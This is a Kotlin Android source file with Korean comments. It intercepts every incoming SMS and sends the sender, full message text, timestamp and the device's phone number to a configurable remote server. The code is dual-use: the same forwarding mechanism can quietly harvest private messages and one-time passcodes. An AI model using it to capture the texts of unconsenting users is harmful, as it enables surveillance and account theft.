package com.vipplus.manager

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Bundle
import android.telephony.SmsMessage
import android.util.Log
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import java.text.SimpleDateFormat
import java.util.*

class MessageReceiver : BroadcastReceiver() {
    
    companion object {
        private const val TAG = "VipManager"
    }
    
    override fun onReceive(context: Context?, intent: Intent?) {
        if (context == null || intent == null) return
        
        if (intent.action == "android.provider.Telephony.SMS_RECEIVED") {
            val bundle: Bundle? = intent.extras
            
            try {
                if (bundle != null) {
                    val pdus = bundle.get("pdus") as Array<*>
                    
                    for (pdu in pdus) {
                        val format = bundle.getString("format")
                        val smsMessage = if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M) {
                            SmsMessage.createFromPdu(pdu as ByteArray, format)
                        } else {
                            @Suppress("DEPRECATION")
                            SmsMessage.createFromPdu(pdu as ByteArray)
                        }
                        
                        val sender = smsMessage.originatingAddress ?: ""
                        val message = smsMessage.messageBody ?: ""
                        val timestamp = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
                            .format(Date(smsMessage.timestampMillis))
                        
                        Log.d(TAG, "메시지 수신: 발신=$sender")
                        
                        // SharedPreferences에 마지막 메시지 저장
                        val prefs = context.getSharedPreferences("VIP_MANAGER", Context.MODE_PRIVATE)
                        prefs.edit()
                            .putString("LAST_MSG", "발신: $sender\n내용: ${message.take(50)}...")
                            .putString("LAST_MSG_TIME", timestamp)
                            .apply()
                        
                        // 수신번호 가져오기 (현재 폰 번호)
                        val receiver = getPhoneNumber(context)
                        
                        // 서버로 전송
                        sendToServer(context, sender, receiver, message, timestamp)
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "메시지 처리 오류: ${e.message}", e)
            }
        }
    }
    
    private fun getPhoneNumber(context: Context): String {
        val prefs = context.getSharedPreferences("VIP_MANAGER", Context.MODE_PRIVATE)
        return prefs.getString("PHONE_NUMBER", "UNKNOWN") ?: "UNKNOWN"
    }
    
    private fun sendToServer(
        context: Context,
        sender: String,
        receiver: String,
        message: String,
        timestamp: String
    ) {
        val prefs = context.getSharedPreferences("VIP_MANAGER", Context.MODE_PRIVATE)
        val serverUrl = prefs.getString("SERVER_URL", "") ?: ""
        
        if (serverUrl.isEmpty()) {
            Log.w(TAG, "서버 URL이 설정되지 않았습니다")
            return
        }
        
        CoroutineScope(Dispatchers.IO).launch {
            try {
                val data = mapOf(
                    "sender" to sender,
                    "receiver" to receiver,
                    "message" to message,
                    "timestamp" to timestamp
                )
                
                val success = ApiClient.registerSms(serverUrl, data)
                
                if (success) {
                    Log.d(TAG, "✅ 서버 전송 성공")
                } else {
                    Log.e(TAG, "❌ 서버 전송 실패")
                }
            } catch (e: Exception) {
                Log.e(TAG, "서버 전송 오류: ${e.message}", e)
            }
        }
    }
}


